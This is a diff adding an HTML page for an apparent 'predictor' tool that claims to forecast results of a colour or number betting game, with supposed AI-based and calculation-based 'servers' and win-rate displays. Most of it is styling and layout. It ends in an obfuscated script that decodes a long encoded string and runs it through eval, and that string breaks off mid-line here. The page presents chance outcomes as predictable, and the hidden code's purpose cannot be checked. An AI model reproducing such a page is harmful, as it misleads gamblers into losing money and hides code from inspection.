@@ -1,0 +1,610 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ADITYA PEDICTOR</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@600&family=Roboto+Slab:wght@700&family=Teko:wght@700&family=Righteous&family=Chakra+Petch:wght@700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Poppins', sans-serif;
+            background-color: #1a1a1a; /* Dark theme background */
+            color: #FF0000; /* White text */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .wrapper {
+            background-color: #FF0000; /* Darker header background */
+            text-align: center;
+            padding: 15px 0;
+            width: 100%;
+            border-bottom: 0px solid #FF0000; /* Emerald green border */
+        }
+
+        svg {
+            font-family: 'Orbitron', sans-serif;
+            width: 100%;
+            height: 50px;
+            margin: 0 auto;
+        }
+
+        svg text {
+            animation: stroke 5s infinite alternate;
+            stroke-width: 2;
+            stroke: #2ecc71; /* Emerald green stroke */
+            font-size: 30px;
+            fill: #2ecc71; /* Emerald green fill */
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        @keyframes stroke {
+            0% { fill: rgba(46, 204, 113, 0); stroke: rgba(46, 204, 113, 1); stroke-dashoffset: 25%; stroke-dasharray: 0 50%; stroke-width: 2; }
+            70% { fill: rgba(46, 204, 113, 0); stroke: rgba(46, 204, 113, 1); }
+            80% { fill: rgba(46, 204, 113, 0); stroke: rgba(46, 204, 113, 1); stroke-width: 3; }
+            100% { fill: rgba(46, 204, 113, 1); stroke: rgba(46, 204, 113, 0); stroke-dashoffset: -25%; stroke-dasharray: 50% 0; stroke-width: 0; }
+        }
+
+        .version-text, .update-text {
+            font-family: 'Righteous', sans-serif;
+            font-size: 12px;
+            color: #FF0000; /* Emerald green text */
+            margin-top: 5px;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 90%;
+            background: #252525; /* Dark container background */
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            margin: 20px auto;
+        }
+
+        .selection-box {
+            margin-bottom: 20px;
+        }
+
+        select {
+            width: 100%;
+            padding: 10px;
+            font-size: 1em;
+            border: 2px solid #2ecc71; /* Emerald green border */
+            border-radius: 8px;
+            background: #333333; /* Dark select background */
+            color: #ffffff; /* White text */
+            font-family: 'Poppins', sans-serif;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: border-color 0.3s ease;
+        }
+
+        select:focus {
+            outline: none;
+            border-color: #27ae60; /* Darker green on focus */
+        }
+
+        .info-box {
+            background: #2d2d2d; /* Darker info box background */
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            border-left: 4px solid #2ecc71; /* Emerald green accent */
+        }
+
+        .info-box span {
+            flex: 1 1 45%;
+            font-size: 0.9em;
+            color: #ffffff; /* White text */
+            margin: 5px 0;
+        }
+
+        .info-box .value {
+            font-family: 'Chakra Petch', sans-serif;
+            font-size: 1.1em;
+            color: #2ecc71; /* Emerald green value */
+            font-weight: 700;
+        }
+
+        .info-box i {
+            margin-right: 8px;
+            color: #2ecc71; /* Emerald green icons */
+        }
+
+        .analysis-container {
+            background: #2d2d2d; /* Dark analysis background */
+            padding: 15px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            margin-bottom: 20px;
+        }
+
+        .analysis-header {
+            font-family: 'Teko', sans-serif;
+            font-size: 1.6em;
+            color: #2ecc71; /* Emerald green header */
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .analysis-box {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+        }
+
+        .analysis-item {
+            background: #333333; /* Dark item background */
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .analysis-item span {
+            display: block;
+            font-size: 0.9em;
+            color: #ffffff; /* White text */
+            margin-bottom: 5px;
+        }
+
+        .analysis-item .value {
+            font-family: 'Chakra Petch', sans-serif;
+            font-size: 1.1em;
+            color: #2ecc71; /* Emerald green value */
+            font-weight: 700;
+        }
+
+        .win-rate-bar {
+            width: 100%;
+            height: 10px;
+            background: #404040; /* Dark gray bar */
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 5px;
+        }
+
+        .win-rate-fill {
+            height: 100%;
+            background: #2ecc71; /* Emerald green fill */
+            border-radius: 5px;
+            transition: width 0.5s ease-in-out;
+        }
+
+        .history {
+            margin-top: 20px;
+        }
+
+        .history-header {
+            font-family: 'Teko', sans-serif;
+            font-size: 1.6em;
+            color: #2ecc71; /* Emerald green header */
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .history-box {
+            background: #2d2d2d; /* Dark history box */
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            position: relative;
+            transition: transform 0.3s ease;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 80px;
+        }
+
+        .history-box:hover {
+            transform: scale(1.02);
+        }
+
+        .history-box.pending {
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2); }
+            50% { box-shadow: 0 2px 15px rgba(46, 204, 113, 0.3); }
+            100% { box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2); }
+        }
+
+        .history-content {
+            flex-grow: 1;
+        }
+
+        .history-box span {
+            display: block;
+            font-size: 0.9em;
+            color: #ffffff; /* White text */
+            margin: 5px 0;
+        }
+
+        .history-box .value {
+            font-family: 'Chakra Petch', sans-serif;
+            font-size: 1em;
+            color: #2ecc71; /* Emerald green value */
+        }
+
+        .animation-container {
+            width: 30px;
+            height: 30px;
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .pending-spinner {
+            width: 100%;
+            height: 100%;
+            border: 3px solid rgba(46, 204, 113, 0.2); /* Emerald green spinner */
+            border-top: 3px solid #2ecc71;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            position: relative;
+        }
+
+        .pending-spinner::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            background: radial-gradient(circle, rgba(46, 204, 113, 0.1) 0%, transparent 70%);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            animation: pulseGlow 1.5s infinite ease-in-out;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulseGlow {
+            0% { transform: translate(-50%, -50%) scale(1); opacity: 0.8; }
+            50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.4; }
+            100% { transform: translate(-50%, -50%) scale(1); opacity: 0.8; }
+        }
+
+        .win-trophy {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            animation: spinTrophy 2s infinite linear;
+        }
+
+        .win-trophy::before {
+            content: '\f091';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            font-size: 20px;
+            color: #2ecc71; /* Emerald green trophy */
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-shadow: 0 0 5px rgba(46, 204, 113, 0.8);
+        }
+
+        .win-trophy::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 25px;
+            height: 25px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="25" height="25"><circle cx="3" cy="3" r="1.5" fill="#2ecc71"/><circle cx="22" cy="3" r="1.5" fill="#2ecc71"/><circle cx="12.5" cy="22" r="1.5" fill="#2ecc71"/><circle cx="6" cy="16" r="1.5" fill="#2ecc71"/><circle cx="19" cy="10" r="1.5" fill="#2ecc71"/></svg>') no-repeat center;
+            animation: confetti 1.5s infinite ease-out;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes spinTrophy {
+            0% { transform: rotateY(0deg); }
+            100% { transform: rotateY(360deg); }
+        }
+
+        @keyframes confetti {
+            0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+            100% { opacity: 0; transform: translate(-50%, -50%) scale(1.3) translateY(-15px); }
+        }
+
+        .loss-signal {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            animation: signalPulse 1.5s infinite ease-in-out;
+        }
+
+        .loss-signal::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 15px;
+            height: 15px;
+            background: #ff4444; /* Red signal */
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 8px rgba(255, 68, 68, 0.8);
+        }
+
+        .loss-signal::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 25px;
+            height: 25px;
+            border: 2px solid #ff4444; /* Red wave */
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            animation: signalWave 1.5s infinite ease-out;
+        }
+
+        @keyframes signalPulse {
+            0% { opacity: 0.7; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.1); }
+            100% { opacity: 0.7; transform: scale(1); }
+        }
+
+        @keyframes signalWave {
+            0% { opacity: 0.8; transform: translate(-50%, -50%) scale(0.5); }
+            100% { opacity: 0; transform: translate(-50%, -50%) scale(1.3); }
+        }
+
+        .clear-btn {
+            width: 100%;
+            padding: 12px;
+            font-size: 1em;
+            background: #333333; /* Dark button background */
+            color: #2ecc71; /* Emerald green text */
+            border: 2px solid #2ecc71; /* Emerald green border */
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Roboto Slab', sans-serif;
+        }
+
+        .clear-btn:hover {
+            background: #2ecc71; /* Emerald green on hover */
+            color: #1a1a1a; /* Dark text on hover */
+        }
+
+        .notification {
+            position: fixed;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            max-width: 300px;
+            padding: 12px 15px;
+            border-radius: 8px;
+            color: #ffffff; /* White text */
+            z-index: 1002;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.3s ease forwards, slideOut 0.3s ease 3s forwards;
+        }
+
+        .notification.win {
+            background: #2ecc71; /* Emerald green for win */
+        }
+
+        .notification.loss {
+            background: #ff4444; /* Red for loss */
+        }
+
+        .notification.alert {
+            background: #ffa500; /* Orange for alert */
+        }
+
+        .notification.server {
+            background: #3498db; /* Blue for server */
+        }
+
+        .notification-text {
+            font-family: 'Poppins', sans-serif;
+            font-size: 1em;
+            font-weight: 600;
+        }
+
+        .notification-close {
+            font-size: 1.1em;
+            cursor: pointer;
+            padding: 0 5px;
+        }
+
+        @keyframes slideIn {
+            0% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+            100% { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+
+        @keyframes slideOut {
+            0% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 999;
+        }
+
+        .break-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #2d2d2d; /* Dark popup background */
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+            z-index: 1001;
+            text-align: center;
+            color: #ffffff; /* White text */
+            border: 2px solid #2ecc71; /* Emerald green border */
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translate(-50%, -40%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
+        }
+
+        .break-popup h3 {
+            margin: 0 0 15px;
+            font-size: 1.6em;
+            font-weight: 700;
+            font-family: 'Teko', sans-serif;
+            color: #2ecc71; /* Emerald green header */
+        }
+
+        .break-popup p {
+            font-size: 1.1em;
+            margin: 0 0 15px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .typing {
+            display: inline-block;
+            overflow: hidden;
+            white-space: nowrap;
+            border-right: 2px solid #2ecc71; /* Emerald green typing cursor */
+            animation: typing 3s steps(30, end) infinite, blink 0.5s step-end infinite;
+        }
+
+        @keyframes typing {
+            0% { width: 0; }
+            50% { width: 100%; }
+            100% { width: 0; }
+        }
+
+        @keyframes blink {
+            0% { border-color: transparent; }
+            50% { border-color: #FF0000; }
+            100% { border-color: transparent; }
+        }
+
+        .result-animation {
+            animation: fadeInScale 0.5s ease forwards;
+        }
+
+        @keyframes fadeInScale {
+            0% { opacity: 0; transform: scale(0.9); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <svg>
+        <text x="50%" y="50%" dy=".35em" text-anchor="middle">
+            ADITYA PREDICTOR
+        </text>
+    </svg>
+    <div class="version-text">VERSION CODE - 1.0 [ PNPIVM1 ]</div>
+    <div class="update-text">UPDATE CODE - P 1.4</div>
+</div>
+
+<div class="container">
+    <div class="selection-box">
+        <select id="resultType" onchange="generateResult(lastPeriodNumber)">
+            <option value="bigsmall">BIG/SMALL</option>
+            <option value="redgreen">RED/GREEN</option>
+        </select>
+        <select id="serverType" onchange="serverChanged()">
+            <option value="" selected disabled>Select Server</option>
+            <option value="server1">SERVER 1</option>
+            <option value="server2">SERVER 2</option>
+            <option value="ai">AI BASED RESULTS</option>
+            <option value="calculation">CALCULATION BASED RESULT</option>
+        </select>
+    </div>
+
+    <div class="info-box">
+        <span><i class="fas fa-calendar-day"></i> Period</span>
+        <span id="periodNumber" class="value">Loading...</span>
+        <span><i class="fas fa-hourglass-half"></i> Time Left</span>
+        <span id="timer" class="value">00:00</span>
+        <span><i class="fas fa-chart-line"></i> Result</span>
+        <span id="currentResult" class="value">Waiting...</span>
+    </div>
+
+    <div class="analysis-container">
+        <div class="analysis-header">
+            Analysis Dashboard
+        </div>
+        <div class="analysis-box">
+            <div class="analysis-item">
+                <span>Most Frequent</span>
+                <span id="mostFrequent" class="value">-</span>
+            </div>
+            <div class="analysis-item">
+                <span>Least Frequent</span>
+                <span id="leastFrequent" class="value">-</span>
+            </div>
+            <div class="analysis-item">
+                <span>Win Rate</span>
+                <span id="winAccuracy" class="value">0%</span>
+                <div class="win-rate-bar">
+                    <div id="winRateFill" class="win-rate-fill" style="width: 0%;"></div>
+                </div>
+            </div>
+            <div class="analysis-item">
+                <span>Wins</span>
+                <span id="totalWins" class="value">0</span>
+            </div>
+            <div class="analysis-item">
+                <span>Losses</span>
+                <span id="totalLosses" class="value">0</span>
+            </div>
+            <div class="analysis-item">
+                <span>Server Status</span>
+                <span id="serverStatus" class="value">Connected</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="history">
+        <div class="history-header">
+            Prediction History
+        </div>
+        <div id="historyBody"></div>
+        <button class="clear-btn" onclick="clearHistory()"><i class="fas fa-trash-alt"></i> Clear History</button>
+    </div>
+</div>
+
+<div class="overlay" id="breakOverlay"></div>
+<div class="break-popup" id="breakPopup">
+    <h3>Play After 2-3 Hours</h3>
+    <p>You've achieved 10 wins or 3 consecutive losses. Take a break!</p>
+</div>
+
+<script>var _0xc85e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe71c(d,e,f){var g=_0xc85e[2][_0xc85e[1]](_0xc85e[0]);var h=g[_0xc85e[3]](0,e);var i=g[_0xc85e[3]](0,f);var j=d[_0xc85e[1]](_0xc85e[0])[_0xc85e[10]]()[_0xc85e[9]](function(a,b,c){if(h[_0xc85e[4]](b)!==-1)return a+=h[_0xc85e[4]](b)*(Math[_0xc85e[8]](e,c))},0);var k=_0xc85e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc85e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe71c(s,e,10)-t)}return decodeURIComponent(escape(r))}("TTrcTjrceLrceUrcejrcjzrTTrceTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceercccrcezrcAcrcecrcAcrceUrcjzrTTrczcrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrceTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceerALrAArjjrTTrcTjrceLrceUrcejrcjzrTTrcjzrcAArcecrcAcrceercccrcezrcAcrcecrcAcrceUrcjzrTTrczcrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcjzrcAArcecrcAcrceerALrAArjjrTTrcTjrceLrceUrcejrcjzrTTrcTjrcjcrceerceercAcrceUrcjzrcUercAcrcejrcjcrcezrcjzrcccrcezrcAcrcecrcAcrceUrcjzrTTrczcrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcTjrcjcrceerceercAcrceUrcjzrcUercAcrcejrcjcrcezrcjzrALrAArjjrTTrcTjrceLrceUrcejrcjzrTTrcATrcAArcejrcjzrceLrceercjArczerceLrcAzrcjArTTrczcrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcATrcAArcejrcjzrceLrceercjArczerceLrcAzrcjArALrAArjjrTTrcTjrceLrceUrcejrcjzrTTrcTerceercAcrcTArcAjrcUTrceLrceTrcjcrceTrTTrczcrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcTerceercAcrcTArcAjrcUTrceLrceTrcjcrceTrALrAArjjrTTrcTjrceLrceUrcejrcjzrTTrcTerceercAcrcTArcAjrcULrcjUrcAcrceercezrcTArcjArTTrczcrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcTerceercAcrcTArcAjrcULrcjUrcAcrceercezrcTArcjArALrAArjjrTTrcTjrceLrceUrcejrcjzrTTrcjLrcAArceUrcUercTArcjzrcAcrccUrcAArcezrcezrTTrczcrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcjLrcAArceUrcUercTArcjzrcAcrccUrcAArcezrcezrALrAArjjrTTrcTjrceLrceUrcejrcjzrTTrcecrceLrcejrcjzrccUrceercAcrceArcjcrcAcrceUrcjzrcccrcezrcAcrcecrcAcrceUrcjzrTTrczcrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcecrceLrcejrcjzrccUrceercAcrceArcjcrcAcrceUrcjzrALrAArjjrTTrcTjrceLrceUrcejrcjzrTTrcezrcAcrcTArcejrcjzrccUrceercAcrceArcjcrcAcrceUrcjzrcccrcezrcAcrcecrcAcrceUrcjzrTTrczcrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcezrcAcrcTArcejrcjzrccUrceercAcrceArcjcrcAcrceUrcjzrALrAArjjrTTrcTjrceLrceUrcejrcjzrTTrceercAcrcejrcjcrcezrcjzrcLzrcjArceTrcAcrcUjrcAcrcezrcAcrcTjrcjzrTTrczcrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrceercAcrcejrcjcrcezrcjzrcLzrcjArceTrcAcrALrAArjjrTTrcTjrceLrceUrcejrcjzrTTrcejrcAcrceercjUrcAcrceercLzrcjArceTrcAcrcUjrcAcrcezrcAcrcTjrcjzrTTrczcrTTrcAzrceLrcTjrcjcrcecrcAcrceUrcjzreUrcALrcAcrcjzrcccrcezrcAcrcecrcAcrceUrcjzrczercjArccArcAzrATrALrcejrcAcrceercjUrcAcrceercLzrcjArceTrcAcrALrAArjjrTTrcezrcAcrcjzrTTrcezrcTArcejrcjzrcUTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceerTTrczcrTTrceUrcjcrcezrcezrjjrTTrcezrcAcrcjzrTTrcATrcAArcejrcjzrceLrceercjArTTrczcrTTrcLjrcTcrjjrTTrcezrcAcrcjzrTTrcTjrcjcrceerceercAcrceUrcjzrcUercAcrcejrcjcrcezrcjzrTTrczcrTTrceUrcjcrcezrcezrjjrTTrcezrcAcrcjzrTTrceTrcAcrceUrcAzrcAArceUrcALrcUercAcrcejrcjcrcezrcjzrTTrczcrTTrceUrcjcrcezrcezrjjrTTrcezrcAcrcjzrTTrcjLrcAArceUrczjrceLrcjcrceUrcjzrTTrczcrTTreTrjjrTTrcezrcAcrcjzrTTrcezrceLrcejrcejrcUjrcjzrceercAcrcTArcAjrTTrczcrTTreTrjjrTTrcezrcAcrcjzrTTrcezrcTArcejrcjzrccUrcAcrcjzrcTjrcATrcAcrcAzrcUTrcAcrceercAArceLrcAzrTTrczcrTTrceUrcjcrcezrcezrjjrTTrcezrcAcrcjzrTTrcjzrceLrcjzrcTArcezrczercAcrcjzrcejrTTrczcrTTreTrjjrTTrcezrcAcrcjzrTTrcjzrceLrcjzrcTArcezrcLLrcAArceUrcejrTTrczcrTTreTrjjrTTrcezrcAcrcjzrTTrcjzrceLrcjzrcTArcezrcUzrceLrcejrcejrcAcrcejrTTrczcrTTreTrjjrTTrcezrcAcrcjzrTTrcAArcejrcUercAcrcejrcjcrcezrcjzrcUTrceerceLrcTjrcAcrcejrcejrcAArceUrcALrTTrczcrTTrcAUrcTArcezrcejrcAcrjjrTTrcezrcAcrcjzrTTrcejrcAcrcezrcAcrcTjrcjzrcAcrcAzrcUjrcAcrceercjUrcAcrceerTTrczcrTTrceUrcjcrcezrcezrjjrTTrcezrcAcrcjzrTTrcejrcAcrceercjUrcAcrceercLLrcAArceUrcejrTTrczcrTTreTrjjrTTrcezrcAcrcjzrTTrcejrcAcrceercjUrcAcrceercUzrceLrcejrcejrcAcrcejrTTrczcrTTreTrjjrTTrcezrcAcrcjzrTTrcecrcjcrcejrcjzrczjrcATrcTArceUrcALrcAcrcUjrcAcrceercjUrcAcrceerTTrczcrTTrcAUrcTArcezrcejrcAcrjjrTTrcAUrcjcrceUrcTjrcjzrcAArceLrceUrTTrcjcrceTrcAzrcTArcjzrcAcrcUTrcAcrceercAArceLrcAzrczArceUrcAzrcLzrcAArcecrcAcrceerATrAArTTrcjjrTTrcTjrceLrceUrcejrcjzrTTrceUrceLrcjLrTTrczcrTTrceUrcAcrcjLrTTrcczrcTArcjzrcAcrATrAArjjrTTrceUrceLrcjLreUrcejrcAcrcjzrcLcrcLzrczjrcUjrcAcrcTjrceLrceUrcAzrcejrATrceUrceLrcjLreUrcALrcAcrcjzrcLcrcLzrczjrcUjrcAcrcTjrceLrceUrcAzrcejrATrAArTTrAjrTTreArAArjjrTTrcTjrceLrceUrcejrcjzrTTrcjArcAcrcTArceerTTrczcrTTrceUrceLrcjLreUrcALrcAcrcjzrcLcrcLzrczjrccUrcjcrcezrcezrcLArcAcrcTArceerATrAArjjrTTrcTjrceLrceUrcejrcjzrTTrcecrceLrceUrcjzrcATrTTrczcrTTrcUjrcjzrceercAArceUrcALrATrceUrceLrcjLreUrcALrcAcrcjzrcLcrcLzrczjrcUcrceLrceUrcjzrcATrATrAArTTrAjrTTreArAAreUrceTrcTArcAzrcUjrcjzrcTArceercjzrATreerezrTTrALreTrALrAArjjrTTrcTjrceLrceUrcejrcjzrTTrcAzrcTArcjArTTrczcrTTrcUjrcjzrceercAArceUrcALrATrceUrceLrcjLreUrcALrcAcrcjzrcLcrcLzrczjrcczrcTArcjzrcAcrATrAArAAreUrceTrcTArcAzrcUjrcjzrcTArceercjzrATreerezrTTrALreTrALrAArjjrTTrcTjrceLrceUrcejrcjzrTTrcjzrceLrcjzrcTArcezrcUcrcAArceUrcjcrcjzrcAcrcejrTTrczcrTTrceUrceLrcjLreUrcALrcAcrcjzrcLcrcLzrczjrccTrceLrcjcrceercejrATrAArTTrAerTTrjUreTrTTrAjrTTrceUrceLrcjLreUrcALrcAcrcjzrcLcrcLzrczjrcUcrcAArceUrcjcrcjzrcAcrcejrATrAArjjrTTrcTjrceLrceUrcejrcjzrTTrceTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceerTTrczcrTTrcTTrAzrcjjrcjArcAcrcTArceerUzcrAzrcjjrcecrceLrceUrcjzrcATrUzcrAzrcjjrcAzrcTArcjArUzcreAreTreTreTrAzrcjjreAreTreTreTreArTTrAjrTTrcjzrceLrcjzrcTArcezrcUcrcAArceUrcjcrcjzrcAcrcejrUzcrcTTrjjrTTrcTjrceLrceUrcejrcjzrTTrceercAcrcecrcTArcAArceUrcAArceUrcALrcUjrcAcrcTjrceLrceUrcAzrcejrTTrczcrTTrjUreTrTTrecrTTrceUrceLrcjLreUrcALrcAcrcjzrcLcrcLzrczjrcUjrcAcrcTjrceLrceUrcAzrcejrATrAArjjrTTrcAArcAUrTTrATrcezrcTArcejrcjzrcUTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceerTTrTArczcrczcrTTrceTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceerAArTTrcjjrTTrcAArcAUrTTrATrceTrcAcrceUrcAzrcAArceUrcALrcUercAcrcejrcjcrcezrcjzrTTrAUrAUrTTrcezrcTArcejrcjzrcUTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceerAArTTrcjjrTTrcTjrcATrcAcrcTjrcAjrcUTrcAcrceUrcAzrcAArceUrcALrcUercAcrcejrcjcrcezrcjzrATrcezrcTArcejrcjzrcUTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceerAArjjrTTrUzcrTTrcezrcTArcejrcjzrcUTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceerTTrczcrTTrceTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceerjjrTTrceTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceercccrcezrcAcrcecrcAcrceUrcjzreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrceTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceerjjrTTrcTjrcjcrceerceercAcrceUrcjzrcUercAcrcejrcjcrcezrcjzrcccrcezrcAcrcecrcAcrceUrcjzreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrTercLLrcTArcAArcjzrcAArceUrcALreUreUreUrTerjjrTTrcAArcAUrTTrATrcejrcAcrcezrcAcrcTjrcjzrcAcrcAzrcUjrcAcrceercjUrcAcrceerTTrAUrAUrTTrTArcecrcjcrcejrcjzrczjrcATrcTArceUrcALrcAcrcUjrcAcrceercjUrcAcrceerAArTTrcALrcAcrceUrcAcrceercTArcjzrcAcrcUercAcrcejrcjcrcezrcjzrATrceTrcAcrceercAArceLrcAzrcUUrcjcrcecrcTercAcrceerAArjjrTTrcAcrcezrcejrcAcrTTrcAArcAUrTTrATrcecrcjcrcejrcjzrczjrcATrcTArceUrcALrcAcrcUjrcAcrceercjUrcAcrceerAArTTrcTjrcjcrceerceercAcrceUrcjzrcUercAcrcejrcjcrcezrcjzrcccrcezrcAcrcecrcAcrceUrcjzreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrTerczjrcATrcTArceUrcALrcAcrTTrcUjrcAcrceercjUrcAcrceerTTrcUercAcrceArcjcrcAArceercAcrcAzrTerjjrTTrUzcrTTrcjzrcAArcecrcAcrceercccrcezrcAcrcecrcAcrceUrcjzreUrcjzrcAcrcjTrcjzrczjrceLrceUrcjzrcAcrceUrcjzrTTrczcrTTrcTTreTreTrjerAzrcjjrcUjrcjzrceercAArceUrcALrATrceercAcrcecrcTArcAArceUrcAArceUrcALrcUjrcAcrcTjrceLrceUrcAzrcejrAAreUrceTrcTArcAzrcUjrcjzrcTArceercjzrATreerezrTTrALreTrALrAArUzcrcTTrjjrTTrUzcrTTrcTArcejrcjArceUrcTjrTTrcAUrcjcrceUrcTjrcjzrcAArceLrceUrTTrcAUrcAcrcjzrcTjrcATrcUTrcTArcALrcAcrATrceTrcTArcALrcAcrAArTTrcjjrTTrcjzrceercjArTTrcjjrTTrcTjrceLrceUrcejrcjzrTTrceercAcrcejrceTrceLrceUrcejrcAcrTTrczcrTTrcTArcjLrcTArcAArcjzrTTrcAUrcAcrcjzrcTjrcATrATrTercATrcjzrcjzrce